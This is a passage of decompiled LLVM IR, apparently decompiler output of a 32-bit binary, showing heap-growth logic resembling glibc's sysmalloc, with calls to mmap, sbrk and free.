  %v5_8053bb6 = icmp slt i32 %v0_8053bab, %v1_8053bb0
  br i1 %v5_8053bb6, label %dec_label_pc_8053bbc, label %dec_label_pc_8053c76

dec_label_pc_8053bbc:                             ; preds = %dec_label_pc_8053bab
  %v2_8053bbe = add i32 %v1_8053bbe, 10
  %v3_8053bbe = add i32 %v2_8053bbe, %v0_8053b67
  %v1_8053bc2 = sub i32 0, %v0_8053b67
  store i32 %v1_8053bc2, i32* %eax.global-to-local, align 4
  %v2_8053bc4 = and i32 %v3_8053bbe, %v1_8053bc2
  store i32 %v2_8053bc4, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_8053bc4, %v1_8053bbe
  br i1 %tmp139, label %dec_label_pc_8053bd0, label %dec_label_pc_8053c76

dec_label_pc_8053bd0:                             ; preds = %dec_label_pc_8053bbc
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053bdd = call i32 @mmap(i32 0, i32 %v2_8053bc4, i32 3, i32 34, i32 0, i32 0, i32 %v1_8053b98, i32 %v1_8053b98)
  store i32 %v8_8053bdd, i32* %eax.global-to-local, align 4
  %v10_8053be5 = icmp eq i32 %v8_8053bdd, -1
  store i32 %v8_8053bdd, i32* %edx.global-to-local, align 4
  br i1 %v10_8053be5, label %dec_label_pc_8053bd0.dec_label_pc_8053c76_crit_edge, label %dec_label_pc_8053bf0

dec_label_pc_8053bd0.dec_label_pc_8053c76_crit_edge: ; preds = %dec_label_pc_8053bd0
  %v0_8053c76.pre = load i32, i32* @global_var_806286c.503, align 4
  br label %dec_label_pc_8053c76

dec_label_pc_8053bf0:                             ; preds = %dec_label_pc_8053bd0
  %v1_8053bf2 = urem i32 %v8_8053bdd, 8
  %v2_8053bf2 = icmp eq i32 %v1_8053bf2, 0
  store i32 %v1_8053bf2, i32* %ecx.global-to-local, align 4
  br i1 %v2_8053bf2, label %dec_label_pc_8053c0b, label %dec_label_pc_8053bf7

dec_label_pc_8053bf7:                             ; preds = %dec_label_pc_8053bf0
  %v0_8053bfc = load i32, i32* @ebx, align 4
  %v2_8053bfe = sub nsw i32 8, %v1_8053bf2
  store i32 %v2_8053bfe, i32* %eax.global-to-local, align 4
  %v2_8053c00 = add i32 %v2_8053bfe, %v8_8053bdd
  store i32 %v2_8053c00, i32* @ecx, align 4
  %v2_8053c03 = sub i32 %v0_8053bfc, %v2_8053bfe
  store i32 %v2_8053c03, i32* %esi.global-to-local, align 4
  %v2_8053c05 = inttoptr i32 %v2_8053c00 to i32*
  store i32 %v2_8053bfe, i32* %v2_8053c05, align 4
  br label %dec_label_pc_8053c15

dec_label_pc_8053c0b:                             ; preds = %dec_label_pc_8053bf0
  store i32 %v8_8053bdd, i32* @ecx, align 4
  %v1_8053c0d = inttoptr i32 %v8_8053bdd to i32*
  store i32 0, i32* %v1_8053c0d, align 4
  br label %dec_label_pc_8053c15

dec_label_pc_8053c15:                             ; preds = %dec_label_pc_8053bf7, %dec_label_pc_8053c0b
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8053bf7 ], [ @ebx, %dec_label_pc_8053c0b ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8053c15 = or i32 %storemerge, 2
  %v1_8053c18 = load i32, i32* @ecx, align 4
  %v2_8053c18 = add i32 %v1_8053c18, 4
  %v3_8053c18 = inttoptr i32 %v2_8053c18 to i32*
  store i32 %v1_8053c15, i32* %v3_8053c18, align 4
  %v0_8053c1b = load i32, i32* @global_var_8062b90.510, align 16
  %v0_8053c20 = load i32, i32* @global_var_8062bb0.512, align 16
  %v1_8053c26 = add i32 %v0_8053c1b, 1
  %v1_8053c27 = load i32, i32* @global_var_8062b98.513, align 8
  %v2_8053c27 = sub i32 %v1_8053c26, %v1_8053c27
  %v8_8053c27 = xor i32 %v1_8053c27, %v1_8053c26
  %v9_8053c27 = xor i32 %v2_8053c27, %v1_8053c26
  %v10_8053c27 = and i32 %v9_8053c27, %v8_8053c27
  %v11_8053c27 = icmp slt i32 %v10_8053c27, 0
  %v12_8053c27 = icmp eq i32 %v2_8053c27, 0
  %v13_8053c27 = icmp slt i32 %v2_8053c27, 0
  store i32 %v1_8053c26, i32* @global_var_8062b90.510, align 16
  %v3_8053c32 = icmp ne i1 %v13_8053c27, %v11_8053c27
  %v4_8053c32 = or i1 %v12_8053c27, %v3_8053c32
  %v7_8053c32 = select i1 %v4_8053c32, i32 %v1_8053c27, i32 %v1_8053c26
  store i32 %v7_8053c32, i32* @global_var_8062b98.513, align 8
  %v0_8053c3e = load i32, i32* @global_var_8062ba4.514, align 4
  %v1_8053c43 = load i32, i32* @ebx, align 4
  %v2_8053c43 = add i32 %v1_8053c43, %v0_8053c3e
  store i32 %v2_8053c43, i32* @global_var_8062ba4.514, align 4
  %tmp86 = icmp ule i32 %v2_8053c43, %v0_8053c20
  %v5_8053c50 = select i1 %tmp86, i32 %v0_8053c20, i32 %v2_8053c43
  store i32 %v5_8053c50, i32* @edx, align 4
  %v1_8053c53 = load i32, i32* @global_var_8062ba8.515, align 8
  %v2_8053c53 = add i32 %v1_8053c53, %v2_8053c43
  store i32 %v5_8053c50, i32* @global_var_8062bb0.512, align 16
  %v1_8053c5f = load i32, i32* @global_var_8062bb4.516, align 4
  %tmp140 = icmp ule i32 %v2_8053c53, %v1_8053c5f
  %v5_8053c65 = select i1 %tmp140, i32 %v1_8053c5f, i32 %v2_8053c53
  store i32 %v5_8053c65, i32* %eax.global-to-local, align 4
  store i32 %v5_8053c65, i32* @global_var_8062bb4.516, align 4
  br label %dec_label_pc_8053b21

dec_label_pc_8053c76:                             ; preds = %dec_label_pc_8053bbc, %dec_label_pc_8053bd0.dec_label_pc_8053c76_crit_edge, %dec_label_pc_8053bab, %dec_label_pc_8053b94
  %v0_8053c76 = phi i32 [ %v0_8053c76.pre, %dec_label_pc_8053bd0.dec_label_pc_8053c76_crit_edge ], [ %v0_8053b29, %dec_label_pc_8053bab ], [ %v0_8053b29, %dec_label_pc_8053bbc ], [ %v0_8053b29, %dec_label_pc_8053b94 ]
  store i32 %v0_8053c76, i32* %eax.global-to-local, align 4
  %v1_8053c7f = add i32 %v0_8053c76, 4
  %v2_8053c7f = inttoptr i32 %v1_8053c7f to i32*
  %v3_8053c7f = load i32, i32* %v2_8053c7f, align 4
  %v1_8053c86 = and i32 %v3_8053c7f, -4
  %v2_8053c86 = icmp eq i32 %v1_8053c86, 0
  store i32 %v1_8053c86, i32* @ebp, align 4
  %v1_8053c8c = load i32, i32* @global_var_8062b88.517, align 8
  %v0_8053c96 = load i8, i8* @global_var_8062ba0.518, align 32
  %v1_8053c96 = urem i8 %v0_8053c96, 2
  %v2_8053c96 = icmp eq i8 %v1_8053c96, 0
  %v1_8053c9d = icmp eq i1 %v2_8053c96, false
  %v1_8053c86.op = sub i32 0, %v1_8053c86
  %v2_8053c94.neg = select i1 %v1_8053c9d, i32 %v1_8053c86.op, i32 0
  %v2_8053c8c = add i32 %v1_8053b98, %v1_8053b36
  %v4_8053c9d = add i32 %v2_8053c8c, %v1_8053c8c
  %v5_8053ca4 = add i32 %v4_8053c9d, %v2_8053c94.neg
  store i32 %v5_8053ca4, i32* %eax.global-to-local, align 4
  %v1_8053ca8 = sub i32 0, %v0_8053b67
  store i32 %v1_8053ca8, i32* @edx, align 4
  %v2_8053cac = and i32 %v5_8053ca4, %v1_8053ca8
  store i32 %v2_8053cac, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_8053cac, 1
  br i1 %tmp87, label %dec_label_pc_8053cca, label %dec_label_pc_8053cb4

dec_label_pc_8053cb4:                             ; preds = %dec_label_pc_8053c76
  store i32 %v2_8053cac, i32* %stack_var_-92, align 4
  %v1_8053cb8 = call i32 @__GI_sbrk(i32 %v2_8053cac)
  store i32 %v1_8053cb8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_8053cc3 = icmp eq i32 %v1_8053cb8, -1
  store i32 %v1_8053cb8, i32* @ebx, align 4
  %v1_8053cc8 = icmp eq i1 %v10_8053cc3, false
  br i1 %v1_8053cc8, label %dec_label_pc_8053d21, label %dec_label_pc_8053cb4.dec_label_pc_8053cca_crit_edge

dec_label_pc_8053cb4.dec_label_pc_8053cca_crit_edge: ; preds = %dec_label_pc_8053cb4
  %v0_8053cca.pre = load i8, i8* @global_var_8062ba0.518, align 32
  br label %dec_label_pc_8053cca

dec_label_pc_8053cca:                             ; preds = %dec_label_pc_8053cb4.dec_label_pc_8053cca_crit_edge, %dec_label_pc_8053c76
  %v0_8053cf7 = phi i32 [ -1, %dec_label_pc_8053cb4.dec_label_pc_8053cca_crit_edge ], [ %v1_8053ca8, %dec_label_pc_8053c76 ]
  %v0_8053cca = phi i8 [ %v0_8053cca.pre, %dec_label_pc_8053cb4.dec_label_pc_8053cca_crit_edge ], [ %v0_8053c96, %dec_label_pc_8053c76 ]
  %v1_8053cca = urem i8 %v0_8053cca, 2
  %v2_8053cca = icmp eq i8 %v1_8053cca, 0
  br i1 %v2_8053cca, label %dec_label_pc_8053cca.dec_label_pc_8053cdf_crit_edge, label %dec_label_pc_8053cd3

dec_label_pc_8053cca.dec_label_pc_8053cdf_crit_edge: ; preds = %dec_label_pc_8053cca
  %v0_8053cdf.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053cdf

dec_label_pc_8053cd3:                             ; preds = %dec_label_pc_8053cca
  %v2_8053cd7 = add i32 %v1_8053c86, %v1_8053b98
  store i32 %v2_8053cd7, i32* %eax.global-to-local, align 4
  %v0_8053cd9 = load i32, i32* @esi, align 4
  %v2_8053cd9 = add i32 %v0_8053cd9, %v2_8053cd7
  %v5_8053cdb = and i32 %v2_8053cd9, %v1_8053ca8
  store i32 %v5_8053cdb, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8053cdf

dec_label_pc_8053cdf:                             ; preds = %dec_label_pc_8053cca.dec_label_pc_8053cdf_crit_edge, %dec_label_pc_8053cd3
  %v3_8053cea = phi i32 [ %v0_8053cdf.pre, %dec_label_pc_8053cca.dec_label_pc_8053cdf_crit_edge ], [ %v5_8053cdb, %dec_label_pc_8053cd3 ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_8053cea, 1048576
  %v5_8053cea = select i1 %tmp88, i32 1048576, i32 %v3_8053cea
  store i32 %v5_8053cea, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_8053cea, %v1_8053bbe
  br i1 %tmp141, label %dec_label_pc_8053cf7, label %dec_label_pc_8053f3c

dec_label_pc_8053cf7:                             ; preds = %dec_label_pc_8053cdf
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8053d04 = call i32 @mmap(i32 0, i32 %v5_8053cea, i32 3, i32 34, i32 0, i32 0, i32 %v0_8053cf7, i32 %v0_8053cf7)
  store i32 %v8_8053d04, i32* %eax.global-to-local, align 4
  %v10_8053d0c = icmp eq i32 %v8_8053d04, -1
  store i32 %v8_8053d04, i32* @ebx, align 4
  br i1 %v10_8053d0c, label %dec_label_pc_8053f3c, label %dec_label_pc_8053d17

dec_label_pc_8053d17:                             ; preds = %dec_label_pc_8053cf7
  %v0_8053d17 = load i8, i8* @global_var_8062ba0.518, align 1
  %v2_8053d17 = and i8 %v0_8053d17, -2
  store i8 %v2_8053d17, i8* @global_var_8062ba0.518, align 32
  %v1_8053d1e = load i32, i32* @esi, align 4
  %v2_8053d1e = add i32 %v1_8053d1e, %v8_8053d04
  store i32 %v2_8053d1e, i32* @edx, align 4
  br label %dec_label_pc_8053d21

dec_label_pc_8053d21:                             ; preds = %dec_label_pc_8053cb4, %dec_label_pc_8053d17
  %v0_8053de8 = phi i32 [ -1, %dec_label_pc_8053cb4 ], [ %v2_8053d1e, %dec_label_pc_8053d17 ]
  %v0_8053df6 = phi i32 [ %v1_8053cb8, %dec_label_pc_8053cb4 ], [ %v8_8053d04, %dec_label_pc_8053d17 ]
  %v10_8053d21 = icmp eq i32 %v0_8053df6, -1
  br i1 %v10_8053d21, label %dec_label_pc_8053f3c, label %dec_label_pc_8053d2a

dec_label_pc_8053d2a:                             ; preds = %dec_label_pc_8053d21
  %v0_8053d2e = load i32, i32* @global_var_8062ba8.515, align 8
  %v1_8053d2e = load i32, i32* @esi, align 4
  %v2_8053d2e = add i32 %v1_8053d2e, %v0_8053d2e
  store i32 %v2_8053d2e, i32* @global_var_8062ba8.515, align 8
  %v2_8053d34 = add i32 %v1_8053c86, %v0_8053c76
  store i32 %v2_8053d34, i32* %ecx.global-to-local, align 4
  %v2_8053d36 = sub i32 %v0_8053df6, %v2_8053d34
  %v7_8053d36 = icmp ult i32 %v0_8053df6, %v2_8053d34
  %v12_8053d36 = icmp eq i32 %v2_8053d36, 0
  %v1_8053d38 = icmp eq i1 %v12_8053d36, false
  br i1 %v1_8053d38, label %dec_label_pc_8053d51, label %dec_label_pc_8053d3a

dec_label_pc_8053d3a:                             ; preds = %dec_label_pc_8053d2a
  %v10_8053d3a = icmp eq i32 %v0_8053de8, -1
  %v1_8053d3d = icmp eq i1 %v10_8053d3a, false
  br i1 %v1_8053d3d, label %dec_label_pc_8053d51, label %dec_label_pc_8053d3f

dec_label_pc_8053d3f:                             ; preds = %dec_label_pc_8053d3a
  store i32 %v0_8053c76, i32* %ecx.global-to-local, align 4
  %v2_8053d43 = add i32 %v1_8053d2e, %v1_8053c86
  %v1_8053d46 = or i32 %v2_8053d43, 1
  store i32 %v1_8053d46, i32* %eax.global-to-local, align 4
  store i32 %v1_8053d46, i32* %v2_8053c7f, align 4
  br label %dec_label_pc_8053e7e

dec_label_pc_8053d51:                             ; preds = %dec_label_pc_8053d3a, %dec_label_pc_8053d2a
  %v0_8053d51 = load i8, i8* @global_var_8062ba0.518, align 1
  %v1_8053d51 = sext i8 %v0_8053d51 to i32
  store i32 %v1_8053d51, i32* %eax.global-to-local, align 4
  %v2_8053d56 = urem i8 %v0_8053d51, 2
  %v3_8053d56 = icmp eq i8 %v2_8053d56, 0
  br i1 %v3_8053d56, label %dec_label_pc_8053d6a, label %dec_label_pc_8053d5a

dec_label_pc_8053d5a:                             ; preds = %dec_label_pc_8053d51
  br i1 %v2_8053c86, label %dec_label_pc_8053d6a, label %dec_label_pc_8053d5e

dec_label_pc_8053d5e:                             ; preds = %dec_label_pc_8053d5a
  %v1_8053d60 = icmp eq i1 %v7_8053d36, false
  br i1 %v1_8053d60, label %dec_label_pc_8053d6a, label %dec_label_pc_8053d62

dec_label_pc_8053d62:                             ; preds = %dec_label_pc_8053d5e
  %v1_8053d62 = and i32 %v1_8053d51, -2
  %v4_8053d62 = trunc i32 %v1_8053d62 to i8
  store i32 %v1_8053d62, i32* %eax.global-to-local, align 4
  store i8 %v4_8053d62, i8* @global_var_8062ba0.518, align 32
  br label %dec_label_pc_8053d6a

dec_label_pc_8053d6a:                             ; preds = %dec_label_pc_8053d5e, %dec_label_pc_8053d5a, %dec_label_pc_8053d51, %dec_label_pc_8053d62
  %v0_8053d6a = phi i8 [ %v0_8053d51, %dec_label_pc_8053d5e ], [ %v0_8053d51, %dec_label_pc_8053d5a ], [ %v0_8053d51, %dec_label_pc_8053d51 ], [ %v4_8053d62, %dec_label_pc_8053d62 ]
  %v1_8053d6a = urem i8 %v0_8053d6a, 2
  %v2_8053d6a = icmp eq i8 %v1_8053d6a, 0
  br i1 %v2_8053d6a, label %dec_label_pc_8053de8, label %dec_label_pc_8053d73

dec_label_pc_8053d73:                             ; preds = %dec_label_pc_8053d6a
  br i1 %v2_8053c86, label %dec_label_pc_8053d81, label %dec_label_pc_8053d77

dec_label_pc_8053d77:                             ; preds = %dec_label_pc_8053d73
  store i32 %v2_8053d36, i32* %eax.global-to-local, align 4
  %v2_8053d7b = add i32 %v2_8053d2e, %v2_8053d36
  store i32 %v2_8053d7b, i32* @global_var_8062ba8.515, align 8
  br label %dec_label_pc_8053d81

dec_label_pc_8053d81:                             ; preds = %dec_label_pc_8053d73, %dec_label_pc_8053d77
  %v1_8053d83 = urem i32 %v0_8053df6, 8
  %v2_8053d83 = icmp eq i32 %v1_8053d83, 0
  store i32 %v1_8053d83, i32* %edx.global-to-local, align 4
  %v1_8053d86 = icmp eq i1 %v2_8053d83, false
  br i1 %v1_8053d86, label %dec_label_pc_8053d8e, label %dec_label_pc_8053d88

dec_label_pc_8053d88:                             ; preds = %dec_label_pc_8053d81
  store i32 %v0_8053df6, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053d98

dec_label_pc_8053d8e:                             ; preds = %dec_label_pc_8053d81
  %v2_8053d93 = sub nsw i32 8, %v1_8053d83
  store i32 %v2_8053d93, i32* %eax.global-to-local, align 4
  %v2_8053d95 = add i32 %v2_8053d93, %v0_8053df6
  store i32 %v2_8053d95, i32* @edi, align 4
  br label %dec_label_pc_8053d98

dec_label_pc_8053d98:                             ; preds = %dec_label_pc_8053d88, %dec_label_pc_8053d8e
  %v0_8053da5 = phi i32 [ 0, %dec_label_pc_8053d88 ], [ %v2_8053d93, %dec_label_pc_8053d8e ]
  %v2_8053d98 = add i32 %v1_8053d2e, %v0_8053df6
  %v2_8053da5 = add i32 %v0_8053da5, %v1_8053c86
  store i32 %v2_8053da5, i32* %ecx.global-to-local, align 4
  %v2_8053da8 = add i32 %v2_8053da5, %v2_8053d98
  store i32 %v2_8053da8, i32* %edx.global-to-local, align 4
  %v2_8053daa = add i32 %v2_8053da8, %v1_8053b98
  %v5_8053dad = and i32 %v2_8053daa, %v1_8053ca8
  %v2_8053db4 = sub i32 %v5_8053dad, %v2_8053da8
  store i32 %v2_8053db4, i32* %eax.global-to-local, align 4
  %v2_8053db6 = add i32 %v2_8053db4, %v2_8053da5
  store i32 %v2_8053db6, i32* @esi, align 4
  store i32 %v2_8053db6, i32* %stack_var_-92, align 4
  %v1_8053dba = call i32 @__GI_sbrk(i32 %v2_8053db6)
  store i32 %v1_8053dba, i32* %eax.global-to-local, align 4
  %v10_8053dc2 = icmp eq i32 %v1_8053dba, -1
  store i32 %v1_8053dba, i32* %edx.global-to-local, align 4
  %v1_8053dc7 = icmp eq i1 %v10_8053dc2, false
  br i1 %v1_8053dc7, label %dec_label_pc_8053dd7, label %dec_label_pc_8053dc9

dec_label_pc_8053dc9:                             ; preds = %dec_label_pc_8053d98
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053dce = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053dce, i32* %eax.global-to-local, align 4
  store i32 %v1_8053dce, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053e0b

dec_label_pc_8053dd7:                             ; preds = %dec_label_pc_8053d98
  %v1_8053dd7 = load i32, i32* @ebx, align 4
  %v7_8053dd7 = icmp ult i32 %v1_8053dba, %v1_8053dd7
  %v1_8053dd9 = icmp eq i1 %v7_8053dd7, false
  br i1 %v1_8053dd9, label %dec_label_pc_8053e10, label %dec_label_pc_8053ddb

dec_label_pc_8053ddb:                             ; preds = %dec_label_pc_8053dd7
  %v0_8053ddb = load i8, i8* @global_var_8062ba0.518, align 1
  %v2_8053ddb = and i8 %v0_8053ddb, -2
  store i8 %v2_8053ddb, i8* @global_var_8062ba0.518, align 32
  store i32 %v2_8053d98, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053def

dec_label_pc_8053de8:                             ; preds = %dec_label_pc_8053d6a
  %v10_8053de8 = icmp eq i32 %v0_8053de8, -1
  br i1 %v10_8053de8, label %dec_label_pc_8053df3, label %dec_label_pc_8053ded

dec_label_pc_8053ded:                             ; preds = %dec_label_pc_8053de8
  store i32 %v0_8053df6, i32* @edi, align 4
  br label %dec_label_pc_8053def

dec_label_pc_8053def:                             ; preds = %dec_label_pc_8053ddb, %dec_label_pc_8053ded
  %v0_8053e1047 = phi i32 [ %v2_8053d98, %dec_label_pc_8053ddb ], [ %v0_8053de8, %dec_label_pc_8053ded ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053e10

dec_label_pc_8053df3:                             ; preds = %dec_label_pc_8053de8
  store i32 %v0_8053df6, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8053dfa = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8053dfa, i32* %edx.global-to-local, align 4
  %v1_8053e01 = load i32, i32* @ebx, align 4
  %v2_8053e01 = sub i32 %v1_8053dfa, %v1_8053e01
  %v1_8053e03 = load i32, i32* @esi, align 4
  %v2_8053e03 = sub i32 %v2_8053e01, %v1_8053e03
  store i32 %v2_8053e03, i32* %eax.global-to-local, align 4
  %v0_8053e05 = load i32, i32* @global_var_8062ba8.515, align 8
  %v2_8053e05 = add i32 %v0_8053e05, %v2_8053e03
  store i32 %v2_8053e05, i32* @global_var_8062ba8.515, align 8
  br label %dec_label_pc_8053e0b

dec_label_pc_8053e0b:                             ; preds = %dec_label_pc_8053dc9, %dec_label_pc_8053df3
  %v0_8053e1046 = phi i32 [ %v1_8053dce, %dec_label_pc_8053dc9 ], [ %v1_8053dfa, %dec_label_pc_8053df3 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8053e10

dec_label_pc_8053e10:                             ; preds = %dec_label_pc_8053dd7, %dec_label_pc_8053def, %dec_label_pc_8053e0b
  %v0_8053e15 = phi i32 [ %v1_8053dba, %dec_label_pc_8053dd7 ], [ %v0_8053e1047, %dec_label_pc_8053def ], [ %v0_8053e1046, %dec_label_pc_8053e0b ]
  %v10_8053e10 = icmp eq i32 %v0_8053e15, -1
  br i1 %v10_8053e10, label %dec_label_pc_8053e7e, label %dec_label_pc_8053e15

dec_label_pc_8053e15:                             ; preds = %dec_label_pc_8053e10
  %v1_8053e15 = load i32, i32* @edi, align 4
  %v2_8053e15 = sub i32 %v0_8053e15, %v1_8053e15
  store i32 %v2_8053e15, i32* %edx.global-to-local, align 4
  %v1_8053e17 = load i32, i32* @esi, align 4
  %v2_8053e17 = add i32 %v1_8053e17, %v2_8053e15
  %v1_8053e1a = or i32 %v2_8053e17, 1
  store i32 %v1_8053e1a, i32* %eax.global-to-local, align 4
  store i32 %v1_8053e15, i32* @global_var_806286c.503, align 4
  %v2_8053e23 = add i32 %v1_8053e15, 4
  %v3_8053e23 = inttoptr i32 %v2_8053e23 to i32*
  store i32 %v1_8053e1a, i32* %v3_8053e23, align 4
  %v0_8053e26 = load i32, i32* @global_var_8062ba8.515, align 8
  %v1_8053e26 = load i32, i32* @esi, align 4
  %v2_8053e26 = add i32 %v1_8053e26, %v0_8053e26
  store i32 %v2_8053e26, i32* @global_var_8062ba8.515, align 8
  br i1 %v2_8053c86, label %dec_label_pc_8053e7e, label %dec_label_pc_8053e30

dec_label_pc_8053e30:                             ; preds = %dec_label_pc_8053e15
  store i32 %v0_8053c76, i32* %ecx.global-to-local, align 4
  %v1_8053e34 = add i32 %v1_8053c86, -12
  %v1_8053e37 = and i32 %v1_8053e34, -8
  store i32 %v1_8053e37, i32* %eax.global-to-local, align 4
  %v1_8053e3c = or i32 %v1_8053e37, 1
  store i32 %v1_8053e3c, i32* %edx.global-to-local, align 4
  %v5_8053e3f = icmp ult i32 %v1_8053e37, 15
  store i32 %v1_8053e3c, i32* %v2_8053c7f, align 4
  %v0_8053e45 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053e45 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053e45 = add i32 %v0_8053e45, 4
  %v3_8053e45 = add i32 %v2_8053e45, %v1_8053e45
  %v4_8053e45 = inttoptr i32 %v3_8053e45 to i32*
  store i32 5, i32* %v4_8053e45, align 4
  %v0_8053e4d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053e4d = load i32, i32* %eax.global-to-local, align 4
  %v2_8053e4d = add i32 %v0_8053e4d, 8
  %v3_8053e4d = add i32 %v2_8053e4d, %v1_8053e4d
  %v4_8053e4d = inttoptr i32 %v3_8053e4d to i32*
  store i32 5, i32* %v4_8053e4d, align 4
  br i1 %v5_8053e3f, label %dec_label_pc_8053e7e, label %dec_label_pc_8053e57

dec_label_pc_8053e57:                             ; preds = %dec_label_pc_8053e30
  %v0_8053e57 = load i32, i32* @global_var_8062b84.519, align 4
  store i32 %v0_8053e57, i32* @ebx, align 4
  %v0_8053e5d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053e62 = add i32 %v0_8053e5d, 8
  store i32 %v1_8053e62, i32* %eax.global-to-local, align 4
  store i32 %v1_8053e62, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8062b84.519, align 4
  %v1_8053e70 = call i32 @free(i32 %v1_8053e62)
  store i32 %v1_8053e70, i32* %eax.global-to-local, align 4
  %v0_8053e78 = load i32, i32* @ebx, align 4
  store i32 %v0_8053e78, i32* @global_var_8062b84.519, align 4
  br label %dec_label_pc_8053e7e

dec_label_pc_8053e7e:                             ; preds = %dec_label_pc_8053e30, %dec_label_pc_8053e15, %dec_label_pc_8053e10, %dec_label_pc_8053d3f, %dec_label_pc_8053e57
  %v0_8053e7e = load i32, i32* @global_var_8062ba8.515, align 8
  %v0_8053e83 = load i32, i32* @global_var_8062bac.520, align 4
  %v0_8053e8f = load i32, i32* @global_var_806286c.503, align 4
  store i32 %v0_8053e8f, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_8053e7e, %v0_8053e83
  %v5_8053e95 = select i1 %tmp89, i32 %v0_8053e83, i32 %v0_8053e7e
  store i32 %v5_8053e95, i32* @edx, align 4
  %v1_8053e98 = load i32, i32* @global_var_8062ba4.514, align 4
  %v2_8053e98 = add i32 %v1_8053e98, %v0_8053e7e
  store i32 %v5_8053e95, i32* @global_var_8062bac.520, align 4
  %v1_8053ea4 = load i32, i32* @global_var_8062bb4.516, align 4
  %tmp90 = icmp ule i32 %v2_8053e98, %v1_8053ea4
  %v5_8053eaa = select i1 %tmp90, i32 %v1_8053ea4, i32 %v2_8053e98
  store i32 %v5_8053eaa, i32* %eax.global-to-local, align 4
  store i32 %v5_8053eaa, i32* @global_var_8062bb4.516, align 4
  %v1_8053eb6 = add i32 %v0_8053e8f, 4
  %v2_8053eb6 = inttoptr i32 %v1_8053eb6 to i32*
  %v3_8053eb6 = load i32, i32* %v2_8053eb6, align 4
  %v1_8053eb9 = and i32 %v3_8053eb6, -4
  store i32 %v1_8053eb9, i32* @ecx, align 4
  %v10_8053ebc = icmp ult i32 %v1_8053eb9, %v1_8053b36
  br i1 %v10_8053ebc, label %dec_label_pc_8053f3c, label %dec_label_pc_8053ec2

dec_label_pc_8053ec2:                             ; preds = %dec_label_pc_8053e7e
  store i32 %v1_8053bbe, i32* %esi.global-to-local, align 4
  %v2_8053ec8 = sub i32 %v1_8053eb9, %v1_8053bbe
  store i32 %v2_8053ec8, i32* %ecx.global-to-local, align 4
  %v2_8053eca = add i32 %v0_8053e8f, %v1_8053bbe
  store i32 %v2_8053eca, i32* @edx, align 4
  %v1_8053ecd = or i32 %v1_8053bbe, 1
  store i32 %v1_8053ecd, i32* %eax.global-to-local, align 4
  store i32 %v2_8053eca, i32* @global_var_806286c.503, align 4
  store i32 %v1_8053ecd, i32* %v2_8053eb6, align 4
  %v0_8053ed9.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8053ed9

dec_label_pc_8053ed9:                             ; preds = %dec_label_pc_8053b44, %dec_label_pc_8053ec2
  %v0_8053ed9 = phi i32 [ %v5_8053b57, %dec_label_pc_8053b44 ], [ %v0_8053ed9.pre, %dec_label_pc_8053ec2 ]
  %v1_8053ed9 = or i32 %v0_8053ed9, 1
  store i32 %v1_8053ed9, i32* @ecx, align 4
  %v0_8053edc = load i32, i32* @ebx, align 4
  %v1_8053edc = add i32 %v0_8053edc, 8
  store i32 %v1_8053edc, i32* %ebx.global-to-local, align 4
  %v1_8053edf = load i32, i32* @edx, align 4
  %v2_8053edf = add i32 %v1_8053edf, 4
  %v3_8053edf = inttoptr i32 %v2_8053edf to i32*
  store i32 %v1_8053ed9, i32* %v3_8053edf, align 4
  br label %dec_label_pc_8053f49

dec_label_pc_8053ee4:                             ; preds = %dec_label_pc_80538f6
  %v5_8053eea = sub i32 %v1_80538d9, %v1_8053bbe
  store i32 %v5_8053eea, i32* %eax.global-to-local, align 4
  %v2_8053eee = add i32 %v0_80539a4118, %v1_8053bbe
  store i32 %v2_8053eee, i32* @edx, align 4
  %v1_8053ef2 = or i32 %v1_8053bbe, 1
  store i32 %v2_8053eee, i32* @global_var_8062870.504, align 16
  store i32 %v1_8053ef2, i32* %v2_80538d3, align 4
  %v0_8053efe = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f00 = or i32 %v0_8053efe, 1
  store i32 %v1_8053f00, i32* @ecx, align 4
  %v0_8053f03 = load i32, i32* @edx, align 4
  store i32 %v0_8053f03, i32* @global_var_806287c.521, align 4
  store i32 %v0_8053f03, i32* @global_var_8062880.506, align 128
  %v1_8053f0f = add i32 %v0_8053f03, 8
  %v2_8053f0f = inttoptr i32 %v1_8053f0f to i32*
  store i32 ptrtoint (i32* @global_var_8062874.505 to i32), i32* %v2_8053f0f, align 4
  %v0_8053f16 = load i32, i32* @edx, align 4
  %v1_8053f16 = add i32 %v0_8053f16, 12
  %v2_8053f16 = inttoptr i32 %v1_8053f16 to i32*
  store i32 ptrtoint (i32* @global_var_8062874.505 to i32), i32* %v2_8053f16, align 4
  %v0_8053f1d = load i32, i32* @ecx, align 4
  %v1_8053f1d = load i32, i32* @edx, align 4
  %v2_8053f1d = add i32 %v1_8053f1d, 4
  %v3_8053f1d = inttoptr i32 %v2_8053f1d to i32*
  store i32 %v0_8053f1d, i32* %v3_8053f1d, align 4
  %v0_8053f20 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053f20 = load i32, i32* @edx, align 4
  %v3_8053f20 = add i32 %v1_8053f20, %v0_8053f20
